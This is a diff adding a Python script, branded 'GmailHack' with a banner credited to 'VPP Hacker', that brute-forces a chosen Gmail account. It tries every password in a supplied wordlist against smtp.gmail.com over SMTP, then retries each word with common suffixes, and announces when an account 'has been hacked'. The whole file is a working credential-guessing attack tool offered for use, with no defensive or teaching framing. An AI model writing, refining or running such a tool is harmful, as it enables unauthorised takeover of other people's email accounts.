@@ -1,0 +1,113 @@
+import smtplib
+from os import system
+
+def main():
+    print("""
+  ____                 _ _ _   _            _
+ / ___|_ __ ___   __ _(_) | | | | __ _  ___| | __
+| |  _| '_ ` _ \ / _` | | | |_| |/ _` |/ __| |/ /
+| |_| | | | | | | (_| | | |  _  | (_| | (__|   <
+ \____|_| |_| |_|\__,_|_|_|_| |_|\__,_|\___|_|\_\\
+""")
+    print('=================================================')
+    print('               coded by VPP Hacker              ')
+    print('           Subscribe Our YouTube Channel         ')
+    print('=================================================')
+
+main()
+print('[1] start the attack')
+print('[2] exit')
+option = input('Enter Option =>')
+if option == '1':  # updated to handle string input
+    file_path = input('Enter Password list :')  # updated for Python 3.x
+else:
+    system('clear')
+    exit()
+
+pass_file = open(file_path, 'r')
+pass_list = pass_file.readlines()
+
+# Define common suffixes for the dictionary attack
+common_suffixes = ['123', '2022', '!', 'password', 'abc', 'qwerty', '111', '1234']
+
+def login():
+    i = 0
+    user_name = input('target email :')  # updated for Python 3.x
+    try:
+        server = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30)
+        server.ehlo()
+    except Exception as e:
+        print(f"Error connecting to server: {e}")
+        return
+
+    # First try all the passwords from the list
+    for password in pass_list:
+        i = i + 1
+        print(f"{i}/{len(pass_list)}")
+
+        try:
+            # Explicitly encode email and password to utf-8 to handle non-ASCII characters
+            user_name = user_name.encode('utf-8', 'ignore').decode('utf-8')  # Encoding email
+            password = password.encode('utf-8', 'ignore').decode('utf-8').strip()  # Encoding password
+
+            # Perform login attempt
+            server.login(user_name, password)
+            system('clear')
+            main()
+            print('\n')
+            print(f'[+] This Account Has Been Hacked Password: {password}     ^_^')
+            break
+        except smtplib.SMTPAuthenticationError as e:
+            error = str(e)
+            if error[14] == '<':
+                system('clear')
+                main()
+                print(f'[+] this account has been hacked, password: {password}     ^_^')
+                break
+            else:
+                print(f'[!] password not found => {password}')
+        except smtplib.SMTPServerDisconnected as e:
+            print("Connection unexpectedly closed. Attempting to reconnect...")
+            server.quit()
+            server = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30)
+            server.ehlo()
+        except UnicodeEncodeError as e:
+            # Catch and skip passwords that have encoding issues
+            print(f"[!] Skipping password due to encoding error: {password}")
+            continue  # Skip this password and move to the next
+
+    # If none of the passwords worked, perform a dictionary attack
+    print("[*] No password from list worked, attempting dictionary attack...")
+
+    # Now, try the dictionary attack by adding common suffixes to each word
+    for base_password in pass_list:
+        base_password = base_password.strip()  # Remove any extra spaces
+        for suffix in common_suffixes:
+            new_password = base_password + suffix
+            try:
+                server.login(user_name, new_password)
+                system('clear')
+                main()
+                print('\n')
+                print(f'[+] This Account Has Been Hacked with Dictionary Attack! Password: {new_password}     ^_^')
+                break
+            except smtplib.SMTPAuthenticationError as e:
+                error = str(e)
+                if error[14] == '<':
+                    system('clear')
+                    main()
+                    print(f'[+] this account has been hacked, password: {new_password}     ^_^')
+                    break
+                else:
+                    print(f'[!] password not found => {new_password}')
+            except smtplib.SMTPServerDisconnected as e:
+                print("Connection unexpectedly closed. Attempting to reconnect...")
+                server.quit()
+                server = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=30)
+                server.ehlo()
+            except UnicodeEncodeError as e:
+                # Catch and skip passwords that have encoding issues
+                print(f"[!] Skipping password due to encoding error: {new_password}")
+                continue  # Skip this password and move to the next
+
+login()
